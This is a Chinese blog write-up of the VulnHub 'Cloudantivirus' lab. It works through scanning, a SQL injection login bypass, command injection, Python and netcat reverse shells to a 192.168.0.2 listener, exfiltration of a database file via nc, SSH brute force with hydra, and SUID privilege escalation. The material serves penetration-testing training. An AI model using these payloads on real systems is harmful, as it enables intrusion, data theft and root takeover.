---
title: Chapter2_Easy_Cloudantivirus
categories:
- Network_Security
- Vulnhub
- Chapter2
tags:
- Network_Security
- Vulnhub
date: 2024-01-14 11:44:53
---

# Cloudantivirus 记录

## 1. 流程记录

### 1.1 扫描与发现

1. 主机发现，arp-scan 是偏向黑客工具，而 arping 是 Linux 发行版常见的工具。
    缺点：arping 不支持网段的扫描，因此需要结合 Linux 脚本循环命令使用。

    ```shell
    for i in $(seq 3 254); do sudo arping -c 2 192.168.0.$i; done
    # 扫描 192.168.0.3-254，-c 表示 count
    ```

2. 端口扫描：
    `sudo nmap -Pn -sV 192.168.0.104 -p 1-65535`
    ![image-20240112141214011](image-20240112141214011.png)

3. 目录爆破
    `dirsearch -u http://192.168.0.104:8080/`
    ![image-20240112142933497](image-20240112142933497.png)
    访问了之后，没啥可利用的页面

4. burp fuzz 一下特殊符号，看看异常：

    ![image-20240112142910986](image-20240112142910986.png)
    发现 `"` 异常厉害，着重关注一下。

### 1.2 打点

1. 发现 SQL 注入，万能密码开梭 `1" or 1=1 -- -`，进入系统：
    ![image-20240112144303351](image-20240112144303351.png)

2. 猜测是命令执行漏洞，逻辑是 `./扫描程序 文件名`，先用 `hello | id` 检测：
    ![image-20240112145302878](image-20240112145302878.png)
    验证成功，确实是。

### 1.3 反弹 Shell

1. 使用 Python 来反弹 shell，又或者看目标机器上是否有 NC：
    `hello | python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`
    用 NC：

    ```bash
    hello | which nc
    hello | /bin/nc 192.168.0.2 4444 -e /bin/sh # 低版本的 NC 没有 -e 参数
    hello | /bin/nc 192.168.0.2 4444 # 测试发现可行，但没有返回 Shell
    ```

2. NC 串联：
    `hello | /bin/nc 192.168.0.2 4444 | /bin/bash | /bin/nc 192.168.0.2 5555 # nc 串联，使用 | 将结果向后传递。`
    创建两个监听端口后，4444 端输入的内容会在靶机的 /bin/bash 下执行，（由于管道符 `|`)，结果会发送到 5555 端：
    ![image-20240112151651716](image-20240112151651716.png)

### 1.4 内部的信息收集与提权

1. 用下载他的 database.sql 文件，本机执行一下，看看有什么特殊信息：

    ```bash
    file database.sql # 发现是 sqlite3 的数据库文件
    nc -vlnp 6666 > db.sql
    nc 192.168.0.2 6666 < database.sql # 在 4444 中执行，将该文件的内容传输到连接通道中去。
    sqlite3 # kali 中打开数据库环境
    sqlite> .open db.sql # 打开数据库文件
    sqlite> .database # 查看当前加载的数据库
    sqlite> .dump # 查看脚本内容
    ```

2. 看样子都是密码，考虑这个密码是不是登录界面的密码，尝试了一下，确实是。同时猜测是否是其 ssh 的密码：
    ```bash
    cat /etc/passwd
    cat /etc/passwd | grep /bin/bash # 筛选能通过 ssh 登录的用户
    ```

    生成用户名和密码（来自数据库）字典，用 hydra 爆破。
    ```bash
    vim username.txt
    vim password.txt
    hydra -L username.txt -P password.txt ssh://192.168.0.104
    ```

    结果没用。

3. 放弃，从其他的角度寻找提权的方式，再进行信息收集，查看文件，结果在上级文件夹下，存在文件：
    ![image-20240112155614433](image-20240112155614433.png)
    update_cloudav 符合 suid 提权条件：

    > https://blog.csdn.net/lv8549510/article/details/85406215
    >
    > suid 作用：给一个用户继承二进制程序所有者拥有的权限，即当执行该文件时，用户暂时获得该二进制文件所有者的权限。

    如果该文件中执行反弹 shell，那么生成的 shell 就有了 root 权限。
    update_cloudav 文件应该是 update_cloudav.c 的二进制文件。

4. 查看更新文件的源码：
    ![image-20240112160113060](image-20240112160113060.png)
    大概分析一下：`command` 变量为命令执行的语句，该命令调用了 `freshclam`（Clamav) 的程序，其中要求添加一个参数。
    再次构建 payload（参数中执行命令)：
    `./update_cloudav "a | nc 192.168.0.2 6666 | /bin/bash | nc 192.168.0.2 7777"`

5. 至此，提权结束：
    ![image-20240112160749970](image-20240112160749970.png)

## 2. 知识点总结

1. arping 与 shell 脚本的混合使用
2. NC 串联
3. ssh 密码爆破思路
4. suid 提权
